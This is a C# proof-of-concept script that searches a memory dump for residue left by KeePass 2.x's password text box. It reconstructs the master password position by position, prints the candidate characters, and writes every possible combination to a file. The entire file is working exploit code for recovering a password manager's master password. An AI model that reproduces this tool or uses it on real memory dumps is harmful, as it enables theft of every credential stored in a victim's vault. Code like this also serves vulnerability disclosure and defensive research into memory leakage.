// Simple POC script that searches a memory dump 
// for passwords written inside KeePass 2.x SecureTextBoxEx 
// text box, such as the master password.

// usage:
// dotnet run <path_to_dump>

using System.Runtime.InteropServices;
using System.Text.RegularExpressions;

namespace keepass_password_dumper;

internal static class Program
{
    // What characters are valid password characters
    private const string AllowedChars = "^[\x20-\x7E]+$";

    // Read file in N-sized chunks
    private const int BufferSize = 524288; //2^19

    private static void Main(string[] args)
    {
        // Windows terminal has issues displaying "●"
        var passwordChar = RuntimeInformation.IsOSPlatform(OSPlatform.Windows) ? "*" : "●";

        if (args.Length != 1)
        {
            Console.WriteLine("Please specify a file path as an argument.");
            return;
        }

        var filePath = args[0];
        if (!File.Exists(filePath))
        {
            Console.WriteLine("File not found.");
            return;
        }

        var candidates = new Dictionary<int, HashSet<string>>();

        var currentStrLen = 0;
        var debugStr = string.Empty;

        using (var fs = new FileStream(filePath, FileMode.Open, FileAccess.Read))
        {
            var buffer = new byte[BufferSize];
            int bytesRead;

            while ((bytesRead = fs.Read(buffer, 0, buffer.Length)) > 0)
            {
                for (var i = 0; i < bytesRead - 1; i++)
                {
                    // ● = 0xCF 0x25
                    if (buffer[i] == 0xCF && buffer[i + 1] == 0x25)
                    {
                        currentStrLen++;
                        i++;
                        debugStr += passwordChar;
                    }
                    else
                    {
                        if (currentStrLen == 0) continue;
                        
                        currentStrLen++;

                        string strChar;
                        try
                        {
                            var character = new[] { buffer[i], buffer[i + 1] };
                            strChar = System.Text.Encoding.Unicode.GetString(character);
                        }
                        catch
                        {
                            continue;
                        }

                        var isValid = Regex.IsMatch(strChar, AllowedChars);

                        if (isValid)
                        {
                            // Convert to UTF 8                            
                            if (!candidates.ContainsKey(currentStrLen))
                            {
                                candidates.Add(currentStrLen, new HashSet<string> { strChar });
                            }
                            else
                            {
                                if (!candidates[currentStrLen].Contains(strChar))
                                    candidates[currentStrLen].Add(strChar);
                            }

                            debugStr += strChar;
                            Console.WriteLine($"Found: {debugStr}");
                        }

                        currentStrLen = 0;
                        debugStr = "";
                    }
                }
            }
        }

        // Print summary
        Console.WriteLine("\nPassword candidates (character positions):");
        Console.WriteLine($"Unknown characters are displayed as \"{passwordChar}\"");

        Console.WriteLine($"1.:\t{passwordChar}");
        var combined = passwordChar;
        var count = 2;

        foreach (var (key, value) in candidates.OrderBy(x => x.Key))
        {
            while (key > count)
            {
                Console.WriteLine($"{count}.:\t{passwordChar}");
                combined += passwordChar;
                count++;
            }

            Console.Write($"{key}.:\t");
            if (value.Count != 1)
                combined += "{";

            foreach (var c in value)
            {
                Console.Write($"{c}, ");

                combined += c;
                if (value.Count != 1)
                    combined += ", ";
            }

            if (value.Count != 1)
                combined = combined[..^2] + "}";

            Console.WriteLine();
            count++;
        }
      
        Console.WriteLine($"Combined: {combined}");
        
        var pwdList = new List<string>();
        generatePwdList(candidates, pwdList);
        File.WriteAllLines("possiblePwds.txt", pwdList);
    }

    private static void generatePwdList(Dictionary<int, HashSet<string>> candidates, List<string> pwdList, string pwd = "")
    {
        foreach (var kvp in candidates)
        {
            if (kvp.Value.Count == 1)
            {
                pwd += kvp.Value.First();
                continue;
            }
            
            foreach (var val in kvp.Value)
            {
                generatePwdList(
                    candidates.Where(x => x.Key >= kvp.Key +1).ToDictionary(d => d.Key, d => d.Value), 
                    pwdList,
                    pwd + val);
            }
            return;
        }
        pwdList.Add(pwd);
    }
}
